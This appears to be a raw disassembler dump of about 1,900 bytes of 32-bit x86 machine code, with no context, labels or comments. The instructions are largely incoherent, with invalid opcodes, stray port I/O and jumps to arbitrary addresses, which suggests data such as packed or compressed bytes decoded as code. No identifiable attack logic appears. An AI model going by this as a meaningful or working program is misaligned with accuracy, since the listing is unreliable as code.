  419f45:	or     al,0x56
  419f47:	or     DWORD PTR [eax],edx
  419f49:	into   
  419f4a:	pop    ds
  419f4b:	(bad)  
  419f4c:	pop    esi
  419f4d:	into   
  419f4e:	adc    eax,0xf8934bd0
  419f53:	xchg   esp,eax
  419f54:	ds loopne 0x419ed9
  419f57:	pop    ebx
  419f58:	inc    edi
  419f59:	sbb    BYTE PTR [ecx+0x1b],dl
  419f5c:	mov    esi,0x7478ce9b
  419f61:	fdivp  st(7),st
  419f63:	pop    edi
  419f64:	iret   
  419f65:	push   edx
  419f66:	je     0x419ef4
  419f68:	fwait
  419f69:	adc    ecx,ebp
  419f6b:	xchg   edx,eax
  419f6c:	mov    esp,0x9ee65d52
  419f71:	stos   DWORD PTR es:[edi],eax
  419f72:	push   esi
  419f73:	(bad)  [ecx+edx*4]
  419f76:	in     al,dx
  419f77:	and    BYTE PTR [ebp+0x12],cl
  419f7a:	add    bl,al
  419f7c:	mov    esi,0x896c2b9b
  419f81:	sar    bh,cl
  419f83:	(bad)
  419f86:	fadd   st,st(3)
  419f88:	cmc    
  419f89:	push   ss
  419f8a:	mov    DWORD PTR [ecx],ecx
  419f8c:	ret    
  419f8d:	jmp    0x86:0x9f4b5089
  419f94:	add    BYTE PTR [eax],al
  419f96:	add    BYTE PTR [eax],al
  419f98:	jl     0x41a009
  419f9a:	stos   BYTE PTR es:[edi],al
  419f9b:	cld    
  419f9c:	(bad)  
  419f9e:	or     DWORD PTR [edi+ebx*4],ecx
  419fa1:	into   
  419fa2:	daa    
  419fa3:	or     BYTE PTR [eax+0x673fba4b],dl
  419fa9:	test   BYTE PTR [edx],dl
  419fab:	push   eax
  419fac:	add    eax,0x1b3feec7
  419fb1:	mov    dl,0x24
  419fb3:	sub    ebp,DWORD PTR [ebp+eiz*4-0x9]
  419fb7:	add    edx,DWORD PTR [edx+esi*2]
  419fba:	cmc    
  419fbb:	jg     0x419f90
  419fbd:	test   eax,0xb63a03f7
  419fc2:	scas   eax,DWORD PTR es:[edi]
  419fc3:	mov    bl,0x57
  419fc5:	sbb    al,0x0
  419fc7:	mov    ss,WORD PTR [eax-0x4e]
  419fca:	jb     0x419f93
  419fcc:	jae    0x419fc0
  419fce:	dec    edi
  419fcf:	out    0xc5,eax
  419fd1:	pop    edi
  419fd2:	xor    eax,0x72b0507e
  419fd7:	ins    DWORD PTR es:[edi],dx
  419fd8:	mov    BYTE PTR [edx-0x69237909],dh
  419fde:	in     eax,0x86
  419fe0:	fcom   QWORD PTR [esi-0x693b742d]
  419fe6:	lods   al,BYTE PTR ds:[esi]
  419fe7:	mov    edi,DWORD PTR [esi+edx*4-0x54cdd448]
  419fee:	test   DWORD PTR [ebx],0xef1c071b
  419ff4:	sbb    ch,bh
  419ff6:	adc    eax,esp
  419ff8:	aaa    
  419ff9:	inc    esi
  419ffa:	lock add eax,DWORD PTR [eax]
  419ffd:	add    BYTE PTR [eax],al
  419fff:	add    BYTE PTR [eax],al
  41a001:	nop
  41a002:	scas   eax,DWORD PTR es:[edi]
  41a003:	test   eax,ecx
  41a005:	jae    0x419fce
  41a007:	in     al,0x4d
  41a009:	int3   
  41a00a:	xchg   esi,eax
  41a00b:	lds    ebx,FWORD PTR [ebp-0x620fae22]
  41a011:	mov    BYTE PTR [edx-0x33],ch
  41a014:	dec    esi
  41a015:	dec    edi
  41a016:	mov    dh,0xb2
  41a018:	sbb    BYTE PTR ds:0x91046f60,al
  41a01e:	mov    dl,0xf7
  41a020:	popf   
  41a021:	mov    eax,0x4f7ecd71
  41a026:	stos   BYTE PTR es:[edi],al
  41a027:	test   DWORD PTR [ebx],0xebd3ff0f
  41a02d:	or     BYTE PTR [edi],bh
  41a02f:	bswap  ebp
  41a031:	aaa    
  41a032:	mov    ah,0xe
  41a034:	jmp    0x11749751
  41a039:	sbb    ebp,DWORD PTR [edx-0x6bff93c2]
  41a03f:	cs rcl BYTE PTR cs:[ebx-0x4d6c17d2],1
  41a047:	push   cs
  41a048:	inc    esi
  41a049:	jecxz  0x419ffe
  41a04b:	cdq    
  41a04c:	lods   eax,DWORD PTR ds:[esi]
  41a04d:	mov    edi,0xb1899bb
  41a052:	and    al,dl
  41a054:	inc    ecx
  41a055:	test   al,ah
  41a057:	lock jmp 0xf250fdf0
  41a05d:	ret    
  41a05e:	sub    eax,edx
  41a060:	int3   
  41a061:	xchg   ebx,eax
  41a062:	pop    ebp
  41a063:	psubsw mm0,QWORD PTR [eax]
  41a066:	add    BYTE PTR [eax],al
  41a068:	add    BYTE PTR [eax],al
  41a06a:	aam    0x7f
  41a06c:	push   ecx
  41a06e:	int3   
  41a06f:	pop    ds
  41a070:	out    dx,eax
  41a071:	icebp  
  41a072:	inc    edx
  41a073:	gs inc ebp
  41a075:	adc    DWORD PTR [edi+0x20],0xfffffff9
  41a079:	loope  0x41a015
  41a07b:	add    BYTE PTR [edi+0x39],0x19
  41a07f:	div    BYTE PTR [edx]
  41a081:	adc    eax,0x3d980604
  41a086:	xor    BYTE PTR [ebx-0x11e54b13],bl
  41a08c:	xor    ah,ch
  41a08e:	adc    ch,BYTE PTR [esi+ebp*8+0x6a]
  41a092:	jnp    0x41a04a
  41a094:	sbb    eax,0x5b37ca2c
  41a099:	add    eax,0xf6dc8a08
  41a09e:	xchg   DWORD PTR [esi+edx*1-0x17],edx
  41a0a2:	xchg   ebx,eax
  41a0a3:	neg    DWORD PTR ds:0xeb5956c
  41a0a9:	jmp    0xa73fe9
  41a0ae:	repnz mov dl,0x78
  41a0b1:	add    DWORD PTR [edi+ecx*1+0x32],ebp
  41a0b5:	push   ds
  41a0b6:	jb     0x41a0b0
  41a0b8:	imul   BYTE PTR [ebx]
  41a0ba:	or     esi,DWORD PTR [ebx-0x47867bf2]
  41a0c0:	xchg   edx,eax
  41a0c1:	int3   
  41a0c2:	mov    dh,0xb2
  41a0c4:	push   cs
  41a0c5:	sbb    ch,0x7e
  41a0c8:	add    al,0x0
  41a0ca:	xor    ch,BYTE PTR [ebx+ebx*1+0x95]
  41a0d1:	add    BYTE PTR [eax],al
  41a0d3:	jnp    0x41a09d
  41a0d5:	aas    
  41a0d6:	or     BYTE PTR ds:0x16841bf3,dh
  41a0dc:	pusha  
  41a0dd:	out    dx,al
  41a0de:	push   edx
  41a0e0:	test   al,0x99
  41a0e2:	test   BYTE PTR [ebp-0x26],dl
  41a0e5:	push   cs
  41a0e6:	add    BYTE PTR [ecx+0x22],ch
  41a0e9:	cdq    
  41a0ea:	push   esp
  41a0eb:	inc    ebp
  41a0ec:	sbb    dl,BYTE PTR [ebp-0x14e5aa8c]
  41a0f2:	push   ebx
  41a0f3:	pop    ebp
  41a0f4:	xor    ecx,edi
  41a0f6:	pmaddwd mm3,mm3
  41a0f9:	adc    eax,DWORD PTR [eax]
  41a0fb:	imul   esp,DWORD PTR [edi],0xd655b4eb
  41a101:	adc    BYTE PTR [eax],al
  41a103:	cmp    DWORD PTR ds:0xb7092483,esi
  41a109:	push   cs
  41a10a:	add    BYTE PTR [edx+0x5d18f6ee],dh
  41a110:	enter  0x8beb,0xf1
  41a114:	ffree  st(7)
  41a116:	lgs    edi,FWORD PTR [eax]
  41a119:	adc    eax,DWORD PTR [eax]
  41a11b:	sub    edi,eax
  41a11d:	bound  esp,QWORD PTR [eiz*4+0xb6c01c7]
  41a124:	jb     0x41a114
  41a126:	and    BYTE PTR gs:[ebx],0x16
  41a12a:	seto   ch
  41a12d:	xlat   BYTE PTR ds:[ebx]
  41a12e:	push   es
  41a12f:	jbe    0x41a13b
  41a131:	xor    DWORD PTR [eax],ecx
  41a133:	outs   dx,BYTE PTR ds:[esi]
  41a134:	pusha  
  41a135:	and    DWORD PTR [esi+0x0],esp
  41a138:	add    BYTE PTR [eax],al
  41a13a:	add    BYTE PTR [eax],al
  41a13c:	or     eax,ecx
  41a13e:	out    dx,al
  41a13f:	jae    0x41a1af
  41a141:	rcr    BYTE PTR [edi-0x285a60f7],1
  41a147:	or     BYTE PTR [esi],ch
  41a149:	mov    dh,BYTE PTR [eax]
  41a14b:	or     BYTE PTR [esi],dh
  41a14d:	pusha  
  41a14e:	and    DWORD PTR [ecx+0x54996dc0],ecx
  41a154:	je     0x41a0db
  41a156:	push   ecx
  41a157:	call   0x7f7e81dc
  41a15c:	mov    dl,0x4b
  41a15e:	adc    bh,ch
  41a160:	nop
  41a161:	push   eax
  41a162:	and    ch,BYTE PTR [edx-0x60]
  41a165:	rcl    BYTE PTR [edi+edi*4+0x71],1
  41a169:	pop    ebx
  41a16a:	xchg   edi,eax
  41a16b:	(bad)  
  41a16c:	mov    ch,0x4b
  41a16e:	add    eax,DWORD PTR [eax]
  41a170:	nop
  41a171:	push   eax
  41a172:	pop    edx
  41a173:	pop    eax
  41a174:	rcl    dl,0xce
  41a177:	and    ebx,esp
  41a179:	out    0xcf,al
  41a17b:	pop    ds
  41a17c:	ror    BYTE PTR [edx-0x4eaef7cf],0x1a
  41a183:	or     DWORD PTR [ecx-0x2],esp
  41a186:	mov    fs,WORD PTR [eax+edx*1]
  41a189:	dec    ebx
  41a18a:	adc    al,BYTE PTR [eax]
  41a18c:	loopne 0x41a170
  41a18e:	jge    0x41a1b4
  41a190:	sbb    al,0x4b
  41a192:	adc    al,BYTE PTR [eax]
  41a194:	cmp    BYTE PTR [ebp-0x12d800e6],bh
  41a19a:	push   ecx
  41a19b:	inc    esp
  41a19c:	je     0x41a13d
  41a19e:	sbb    dh,BYTE PTR [ecx]
  41a1a0:	add    BYTE PTR [eax],al
  41a1a2:	add    BYTE PTR [eax],al
  41a1a4:	add    BYTE PTR [eax-0x45],dl
  41a1a7:	mov    WORD PTR [esi+0x90b714],?
  41a1ad:	nop
  41a1ae:	mov    dl,0xf7
  41a1b0:	or     ebp,DWORD PTR [edx-0x46]
  41a1b3:	jp     0x41a174
  41a1b5:	mov    bl,0xde
  41a1b7:	sbb    eax,0x6f961443
  41a1bc:	add    edx,DWORD PTR [eax+0x44b3dfb2]
  41a1c2:	pop    ebp
  41a1c3:	add    DWORD PTR [eax+0x7ef4b9d8],0xf
  41a1ca:	mov    ah,0xf7
  41a1cc:	add    edx,DWORD PTR [ebx]
  41a1ce:	fs int3 
  41a1d0:	out    dx,eax
  41a1d1:	or     BYTE PTR [esi],al
  41a1d3:	adc    al,0xb0
  41a1d5:	pop    ebp
  41a1d6:	sub    DWORD PTR ds:0xf7a2b32b,esi
  41a1dc:	add    ecx,DWORD PTR [edx+esi*2]
  41a1df:	in     eax,0x7f
  41a1e1:	div    DWORD PTR [ebx-0x70f6fc09]
  41a1e7:	xlat   BYTE PTR ds:[ebx]
  41a1e8:	in     eax,dx
  41a1e9:	iret   
  41a1ea:	mov    dl,0x7d
  41a1ec:	adc    al,0x85
  41a1ee:	mov    bl,0xf7
  41a1f0:	rcl    BYTE PTR [esi+0x29],1
  41a1f3:	aaa    
  41a1f4:	mov    bh,ah
  41a1f6:	xchg   esi,eax
  41a1f7:	iret   
  41a1f8:	push   ebp
  41a1f9:	ins    DWORD PTR es:[edi],dx
  41a1fa:	mov    bl,0xf7
  41a1fc:	add    edi,DWORD PTR [esi+0x78dfbc2a]
  41a202:	sub    dh,BYTE PTR [edi+ebx*8+0x7f7301a3]
  41a209:	add    BYTE PTR [eax],al
  41a20b:	add    BYTE PTR [eax],al
  41a20d:	add    BYTE PTR [edx+ecx*1-0x8],dh
  41a211:	add    edx,DWORD PTR [eax+0x73c8bd02]
  41a217:	popf   
  41a218:	int3   
  41a219:	adc    esi,DWORD PTR ds:0x6139c55c
  41a21f:	jb     0x41a247
  41a221:	mov    ah,0x1a
  41a223:	aaa    
  41a224:	sbb    al,0x58
  41a226:	pop    ds
  41a227:	pop    esp
  41a228:	clc    
  41a229:	mov    bl,0x14
  41a22b:	xchg   BYTE PTR [edi],cl
  41a22d:	push   0x58
  41a22f:	mov    edx,0x6b87a021
  41a234:	cwde   
  41a235:	cmp    eax,0x2d97c3e8
  41a23a:	call   0xf86f77f6
  41a23f:	(bad)  
  41a240:	push   ss
  41a241:	jmp    0x55db54d9
  41a246:	call   0x942ab35a
  41a24b:	das    
  41a24c:	shl    esi,0x17
  41a24f:	mov    ebp,0xeb93e90f
  41a254:	aas    
  41a255:	rcr    edi,1
  41a257:	pop    esp
  41a258:	out    dx,al
  41a259:	jmp    0xbd74916e
  41a25e:	mov    ebx,ebp
  41a260:	and    ecx,ebp
  41a262:	xchg   ebx,eax
  41a263:	xor    edi,esp
  41a265:	inc    esi
  41a266:	xchg   ebx,eax
  41a267:	das    
  41a268:	adc    al,ch
  41a26a:	xchg   ebx,eax
  41a26b:	mov    dl,0xed
  41a26d:	fsub   QWORD PTR [ebx-0x3b]
  41a270:	dec    esi
  41a271:	jmp    0x41a276
  41a276:	add    BYTE PTR [eax-0x19],ah
  41a279:	xor    eax,0x93ad93e9
  41a27e:	in     al,0x89
  41a280:	mov    dl,0xe
  41a282:	push   0xffffffc0
  41a284:	xchg   esi,eax
  41a285:	sahf   
  41a286:	jmp    0x41a21b
  41a288:	mov    dl,0xe
  41a28a:	jge    0x41a21e
  41a28c:	enter  0xfeed,0xbf
  41a290:	xchg   esi,eax
  41a291:	mov    ds:0xedb293eb,al
  41a296:	aam    0x3f
  41a298:	ret    0xe94e
  41a29b:	mov    esi,0xf8de0ee7
  41a2a0:	stos   BYTE PTR es:[edi],al
  41a2a1:	cdq    
  41a2a2:	cmp    eax,0x4d99c338
  41a2a7:	cmp    bl,dh
  41a2a9:	and    DWORD PTR [eax],eax
  41a2ab:	loopne 0x41a28a
  41a2ad:	pop    edx
  41a2ae:	and    al,0x71
  41a2b0:	sub    ecx,eax
  41a2b2:	(bad)  
  41a2b4:	fimul  DWORD PTR [esi]
  41a2b6:	add    cl,bh
  41a2b8:	fist   DWORD PTR [edx+0x24]
  41a2bb:	xchg   ebp,eax
  41a2bc:	(bad)  
  41a2be:	mov    esp,DWORD PTR [ebx]
  41a2c0:	fisub  WORD PTR [edx+0x24]
  41a2c3:	aad    0x3b
  41a2c5:	stc    
  41a2c6:	or     edx,edi
  41a2c8:	mov    esi,0xa9a73974
  41a2cd:	fs popa 
  41a2cf:	(bad)  
  41a2d0:	ins    DWORD PTR es:[edi],dx
  41a2d1:	pop    esp
  41a2d2:	pop    es
  41a2d3:	iret   
  41a2d4:	or     eax,DWORD PTR [ebx+ecx*4+0x2a]
  41a2d8:	(bad)  
  41a2da:	call   0x41a2df
  41a2df:	add    BYTE PTR [edx-0x46],bl
  41a2e2:	jmp    0x41a2e3
  41a2e4:	sub    ah,BYTE PTR [edi+0x2f3d0feb]
  41a2ea:	adc    al,BYTE PTR [eax]
  41a2ec:	mov    ecx,0x2d0fcf29
  41a2f1:	daa    
  41a2f2:	adc    DWORD PTR [eax],eax
  41a2f4:	test   eax,0x4c01e733
  41a2f9:	jg     0x41a292
  41a2fb:	inc    esp
  41a2fc:	lea    eax,[esi]
  41a2fe:	xchg   edi,eax
  41a2ff:	dec    esp
  41a300:	dec    ebp
  41a301:	dec    esi
  41a302:	cmp    ebp,DWORD PTR cs:[eax-0x5b6fec6]
  41a309:	xchg   edx,eax
  41a30a:	adc    eax,0x6520589
  41a30f:	mov    edi,DWORD PTR [edx+esi*1+0x5b]
  41a313:	and    al,0x35
  41a315:	mov    esi,0xb63805fc
  41a31a:	test   DWORD PTR [edi],0xc01f5713
  41a320:	jns    0x41a33e
  41a322:	jmp    0x41a339
  41a324:	leave  
  41a325:	pop    esp
  41a326:	add    BYTE PTR cs:[eax+0x1b0c56cc],dl
  41a32d:	mov    al,ds:0x880b17f6
  41a332:	neg    BYTE PTR [ebx]
  41a334:	arpl   WORD PTR [edx],sp
  41a336:	ins    BYTE PTR es:[edi],dx
  41a337:	je     0x41a2ed
  41a339:	ret    
  41a33a:	xchg   ebx,eax
  41a33b:	inc    esp
  41a33c:	lods   al,BYTE PTR ds:[esi]
  41a33d:	push   edi
  41a33e:	jmp    0xf6f9ac88
  41a343:	push   edi
  41a344:	add    BYTE PTR [eax],al
  41a346:	add    BYTE PTR [eax],al
  41a348:	add    BYTE PTR [ebx-0x4b8b93c3],bh
  41a34e:	outs   dx,DWORD PTR ds:[esi]
  41a34f:	test   BYTE PTR [esi+0x1b],bh
  41a352:	cwde   
  41a353:	mul    BYTE PTR [ebx-0x7eedb46e]
  41a359:	adc    al,0x70
  41a35b:	inc    edx
  41a35c:	add    dl,BYTE PTR [eax+0xc0d124b]
  41a362:	loop   0x41a364
  41a364:	std    
  41a365:	mov    edi,0x2446d0
  41a36a:	dec    esi
  41a36b:	adc    al,BYTE PTR [eax]
  41a36d:	scas   eax,DWORD PTR es:[edi]
  41a36e:	push   esi
  41a36f:	out    dx,al
  41a370:	push   cs
  41a371:	push   eax
  41a372:	dec    ebx
  41a373:	imul   edx,DWORD PTR [esp+esi*2+0x53],0xffffffc3
  41a378:	(bad)  
  41a379:	test   eax,0x8ffd00b9
  41a37e:	aam    0x7e
  41a380:	and    ebx,eax
  41a382:	jae    0x41a356
  41a384:	je     0x41a321
  41a386:	dec    ebx
  41a387:	mov    esi,?
  41a389:	add    al,0x1f
  41a38b:	neg    BYTE PTR ds:0x7c0a901b
  41a391:	mov    bh,0x4b
  41a393:	adc    al,BYTE PTR [eax+edx*2-0x730a69a0]
  41a39a:	dec    ebx
  41a39b:	adc    cl,BYTE PTR ds:0x15f60706
  41a3a1:	and    DWORD PTR [ecx-0x35],0xffffffc5
  41a3a5:	(bad)  
  41a3a6:	mov    dl,0x7b
  41a3a8:	les    edx,FWORD PTR [ebx+0x9df7b2]
  41a3ae:	add    BYTE PTR [eax],al
  41a3b0:	add    BYTE PTR [eax],al
  41a3b2:	xchg   ecx,eax
  41a3b3:	sti    
  41a3b4:	adc    BYTE PTR [ebx-0x6b],al
  41a3b7:	cs enter 0x9005,0xb2
  41a3bc:	pop    ds
  41a3bd:	add    DWORD PTR [ecx+ebp*8],ecx
  41a3c0:	stc    
  41a3c1:	add    edx,DWORD PTR [eax-0x11780b16]
  41a3c7:	mov    dl,0xf7
  41a3c9:	add    ecx,DWORD PTR [eax-0x57]
  41a3cc:	jnp    0x41a425
  41a3ce:	nop
  41a3cf:	mov    dl,0xf7
  41a3d1:	mov    ebx,0x7b72f9c
  41a3d6:	nop
  41a3d7:	mov    dl,0x5d
  41a3d9:	ret    
  41a3da:	fs mov ebp,0xb569b9f7
  41a3e0:	jp     0x41a459
  41a3e2:	je     0x41a41a
  41a3e4:	clc    
  41a3e5:	add    edx,DWORD PTR [eax+0x681b8d2d]
  41a3eb:	mov    edi,esi
  41a3ed:	add    ecx,DWORD PTR [edx+esi*2]
  41a3f0:	std    
  41a3f1:	xchg   ecx,esi
  41a3f3:	lods   eax,DWORD PTR ds:[esi]
  41a3f4:	test   DWORD PTR [ebx],0xabf3cc3e
  41a3fa:	dec    edi
  41a3fb:	daa    
  41a3fc:	mov    edi,fs
  41a3fe:	inc    ebx
  41a3ff:	sub    eax,0x87a01b3d
  41a404:	test   DWORD PTR [ebx],0x87cd730c
  41a40a:	or     DWORD PTR [edi-0x18f6fc09],ebp
  41a410:	sar    DWORD PTR [edi+0x42718218],cl
  41a416:	add    BYTE PTR [eax],al
  41a418:	add    BYTE PTR [eax],al
  41a41a:	add    BYTE PTR [edi],ah
  41a41c:	dec    ebx
  41a41d:	call   0xf7f516a4
  41a422:	adc    BYTE PTR [eax+0xf7c07ab],dl
  41a428:	jb     0x41a439
  41a42a:	or     DWORD PTR [ebx-0x27],eax
  41a42d:	out    dx,eax
  41a42e:	jmp    0xf25056d3
  41a433:	int3   
  41a434:	pop    ss
  41a435:	stc    
  41a436:	icebp  
  41a437:	aam    0x52
  41a439:	pop    ss
  41a43a:	loop   0x41a49f
  41a43c:	das    
  41a43d:	inc    ebx
  41a43e:	add    eax,0xe8592d50
  41a443:	or     BYTE PTR [eax+0x1e],dh
  41a446:	shl    DWORD PTR gs:[ebx-0x65416f2],1
  41a44d:	adc    ebp,eax
  41a44f:	xchg   ebx,eax
  41a450:	sub    edi,ebx
  41a452:	ins    BYTE PTR es:[edi],dx
  41a453:	sahf   
  41a454:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a455:	xchg   edx,eax
  41a456:	fist   WORD PTR [edi-0x33fef14e]
  41a45c:	fimul  WORD PTR [ecx]
  41a45e:	jmp    0x197482f1
  41a463:	pop    ebx
  41a464:	sbb    BYTE PTR [edx+0x3d22acae],0xe9
  41a46b:	xchg   ebx,eax
  41a46c:	cs iret 
  41a46e:	ficom  WORD PTR [edi]
  41a470:	mov    dl,BYTE PTR [edx]
  41a472:	jmp    0x584ce0a
  41a477:	shr    BYTE PTR [edx],1
  41a479:	pop    esp
  41a47a:	jmp    0xed85fb5c
  41a47f:	add    BYTE PTR [eax],al
  41a481:	add    BYTE PTR [eax],al
  41a483:	add    BYTE PTR [edx],bl
  41a485:	push   0x5788b6f7
  41a48a:	out    dx,al
  41a48b:	push   eax
  41a48c:	test   al,0x58
  41a48e:	out    dx,al
  41a48f:	ss and al,0x97
  41a492:	rcl    BYTE PTR gs:[ebx+0x387413cc],cl
  41a499:	xchg   ebx,eax
  41a49a:	ss jb  0x41a44c
  41a49d:	dec    edx
  41a49e:	outs   dx,BYTE PTR ds:[esi]
  41a49f:	(bad)  
  41a4a0:	xchg   ebx,eax
  41a4a1:	mov    dl,0x92
  41a4a3:	sub    DWORD PTR [edi+0x33],ebx
  41a4a6:	jmp    0xef50eab
  41a4ab:	data16 js 0x41a518
  41a4ae:	xor    ah,BYTE PTR [ecx]
  41a4b0:	xor    esp,ebx
  41a4b2:	cld    
  41a4b3:	push   0x66
  41a4b5:	or     eax,0x4f8544ad
  41a4ba:	push   ss
  41a4bb:	mov    esi,0xf3339
  41a4c0:	ds pop edx
  41a4c2:	push   esi
  41a4c3:	adc    al,0x69
  41a4c5:	scas   al,BYTE PTR es:[edi]
  41a4c6:	xchg   ecx,eax
  41a4c7:	shl    BYTE PTR [edx-0x1d7cd91],0xd9
  41a4ce:	shl    DWORD PTR [esi+0x0],1
  41a4d1:	outs   dx,DWORD PTR ds:[esi]
  41a4d2:	xor    ah,BYTE PTR [ecx]
  41a4d4:	les    esi,FWORD PTR [edx+0x4aa58b74]
  41a4da:	pop    ds
  41a4db:	data16 lock outs dx,BYTE PTR ds:[esi]
  41a4de:	xor    ah,BYTE PTR [ebx]
  41a4e0:	test   DWORD PTR [ecx-0x4c96fe54],ebp
  41a4e6:	push   cs
  41a4e7:	mov    al,BYTE PTR [eax]
  41a4e9:	add    BYTE PTR [eax],al
  41a4eb:	add    BYTE PTR [eax],al
  41a4ed:	jne    0x41a539
  41a4ef:	push   cs
  41a4f0:	mov    al,ch
  41a4f2:	dec    esi
  41a4f3:	add    ecx,DWORD PTR [edx-0x7f2b270d]
  41a4f9:	or     BYTE PTR [esi-0x698cfece],ch
  41a4ff:	bound  ebx,QWORD PTR [esi*1-0x2cf39d6a]
  41a506:	mov    al,0x46
  41a508:	test   BYTE PTR [eax+ebx*2+0x51],bl
  41a50c:	inc    esp
  41a50d:	test   DWORD PTR [edx],edx
  41a50f:	test   DWORD PTR [edx],0x8446ae63
  41a515:	int3   
  41a516:	push   esp
  41a517:	push   ecx
  41a518:	inc    esp
  41a519:	xchg   ebp,eax
  41a51a:	ds pop ss
  41a51c:	lock add ebx,DWORD PTR [eax+ebx*4+0x128ef9c6]
  41a524:	and    al,0x90
  41a526:	inc    edi
  41a527:	fadd   st,st(7)
  41a529:	in     al,0x63
  41a52b:	xchg   esi,eax
  41a52c:	(bad)  
  41a52d:	fadd   QWORD PTR [eax+ecx*4+0x7]
  41a531:	call   0x8e2ab577
  41a536:	xor    edx,esp
  41a538:	push   edi
  41a539:	stos   BYTE PTR es:[edi],al
  41a53a:	dec    edi
  41a53b:	xchg   esi,eax
  41a53c:	jmp    0x41a517
  41a53e:	pop    esp
  41a53f:	aad    0xbe
  41a541:	fwait
  41a542:	jnp    0x41a5ad
  41a544:	retf   0x6b10
  41a547:	adc    DWORD PTR [eax-0x3227b5ca],eax
  41a54d:	pushf  
  41a54e:	ja     0x41a4d8
  41a550:	aas    
  41a551:	add    BYTE PTR [eax],al
  41a553:	add    BYTE PTR [eax],al
  41a555:	add    BYTE PTR [ebx+eiz*1],dl
  41a558:	mov    ebx,0xcaa74cc4
  41a55d:	pop    ds
  41a55e:	nop
  41a55f:	dec    ebx
  41a560:	adc    cl,BYTE PTR ds:0x27f6874d
  41a566:	fwait
  41a567:	cmp    eax,DWORD PTR ds:0xe9b798c2
  41a56d:	imul   ebx,DWORD PTR [eax-0x36],0x4b88002c
  41a574:	adc    bl,BYTE PTR [ebx-0x3a]
  41a577:	or     ebx,esp
  41a579:	jae    0x41a514
  41a57b:	mov    cl,0x6a
  41a57d:	jg     0x41a54d
  41a57f:	dec    ebx
  41a580:	jmp    0x1d02:0x886eb7ff
  41a587:	adc    dh,dh
  41a589:	and    eax,DWORD PTR [eax-0x32]
  41a58c:	(bad)  
  41a58d:	and    ebx,DWORD PTR [eax+0x1b]
  41a590:	or     cl,BYTE PTR [esp+ecx*4+0x470d124a]
  41a597:	psadbw mm4,QWORD PTR [eax]
  41a59a:	fst    st(0)
  41a59c:	outs   dx,BYTE PTR ds:[esi]
  41a59d:	and    al,0x28
  41a59f:	dec    ecx
  41a5a0:	adc    al,BYTE PTR [eax]
  41a5a2:	loopne 0x41a556
  41a5a4:	in     al,0x54
  41a5a6:	aam    0x8e
  41a5a8:	mov    esi,0xa7b2db78
  41a5ad:	js     0x41a5f5
  41a5af:	push   ebp
  41a5b0:	mov    ds:0xbc1d84eb,eax
  41a5b5:	out    0x7e,eax
  41a5b7:	sub    esi,DWORD PTR [edi+eiz*8+0x0]
  41a5be:	add    BYTE PTR [edi+0x28],ch
  41a5c1:	mov    esp,0xb42a6fe7
  41a5c6:	out    0x9c,eax
  41a5c8:	dec    ebx
  41a5c9:	lahf   
  41a5ca:	push   cs
  41a5cb:	sub    eax,0x9cc44055
  41a5d0:	mov    ecx,0x279499f7
  41a5d5:	fs out 0x3,eax
  41a5d8:	mov    dl,0xf7
  41a5da:	add    ebx,DWORD PTR [ecx]
  41a5dc:	shl    BYTE PTR gs:[edx-0x78084d46],0xd0
  41a5e4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a5e5:	jae    0x41a626
  41a5e7:	xchg   edx,eax
  41a5e8:	mov    dl,0xf7
  41a5ea:	sub    DWORD PTR [esi+ecx*4],0x7b
  41a5ee:	add    edx,DWORD PTR [eax+0xc78f7b2]
  41a5f4:	mov    cs,WORD PTR [ebx+eax*1-0x70]
  41a5f8:	mov    dl,0xe4
  41a5fa:	jbe    0x41a5cc
  41a5fc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a5fd:	and    eax,0x87296043
  41a602:	js     0x41a603
  41a604:	jb     0x41a596
  41a606:	repz ss push eax
  41a609:	clc    
  41a60a:	add    ebp,DWORD PTR [ebp+0x1933e0b1]
  41a610:	jae    0x41a649
  41a612:	and    eax,DWORD PTR [eax-0x6afca8cd]
  41a618:	mov    cl,0xf7
  41a61a:	clc    
  41a61b:	dec    esi
  41a61c:	sub    BYTE PTR [ebx+0xf494703],bh
  41a622:	loope  0x41a624
  41a624:	add    BYTE PTR [eax],al
  41a626:	add    BYTE PTR [eax],al
  41a628:	rcl    BYTE PTR [edx+0x17],cl
  41a62b:	loop   0x41a5f0
  41a62d:	push   ebp
  41a62e:	inc    esp
  41a62f:	std    
  41a630:	mov    cl,ch
  41a632:	jmp    0x41a652
  41a634:	xchg   esp,eax
  41a635:	retf   0x9e4e
  41a638:	push   0xd6e07854
  41a63d:	(bad)  
  41a63e:	xor    ch,BYTE PTR [ecx-0x4089a38]
  41a644:	push   sp
  41a646:	out    dx,al
  41a647:	ins    DWORD PTR es:[edi],dx
  41a648:	shl    DWORD PTR [ebp-0x4d6e836e],cl
  41a64e:	push   cs
  41a64f:	dec    edi
  41a650:	aad    0xee
  41a652:	xor    ah,BYTE PTR [eax]
  41a654:	and    al,0x2b
  41a656:	inc    ebx
  41a657:	or     eax,0x25cfce2c
  41a65c:	xor    BYTE PTR [ebx-0x11aab0ea],bl
  41a662:	xor    bh,ah
  41a664:	or     ecx,esi
  41a666:	iret   
  41a667:	sub    eax,0x691696f0
  41a66c:	or     BYTE PTR [eax+0x40eae926],dl
  41a672:	push   ebx
  41a673:	(bad)
  41a676:	xlat   BYTE PTR ds:[ebx]
  41a677:	ins    BYTE PTR es:[edi],dx
  41a678:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a679:	fimul  WORD PTR [eax]
  41a67b:	(bad)  
  41a67c:	ror    BYTE PTR [edi-0x52ab95f6],1
  41a682:	je     0x41a644
  41a684:	or     edx,DWORD PTR [esi+0x64]
  41a687:	in     al,dx
  41a688:	icebp  
  41a689:	pushf  
  41a68a:	push   ss
  41a68b:	cmc    
  41a68c:	add    BYTE PTR [eax],al
  41a68e:	add    BYTE PTR [eax],al
  41a690:	add    BYTE PTR [ebx-0x52d66e13],bh
  41a696:	call   0xdce0:0x9988dbe0
  41a69d:	test   al,0xf1
  41a69f:	xchg   edi,eax
  41a6a0:	mov    ch,0xb7
  41a6a2:	mov    ebx,0x55ab0079
  41a6a7:	cdq    
  41a6a8:	dec    esp
  41a6a9:	lea    ecx,[edx-0xa]
  41a6ac:	lea    ebp,[ebx-0x52]
  41a6af:	push   cs
  41a6b0:	test   BYTE PTR [ecx+0x7b0a9257],ch
  41a6b6:	scas   eax,DWORD PTR es:[edi]
  41a6b7:	push   cs
  41a6b8:	mov    ebx,DWORD PTR ds:0x7f6b0673
  41a6be:	push   ebp
  41a6bf:	pcmpeqb mm1,QWORD PTR [ebp+0x4b]
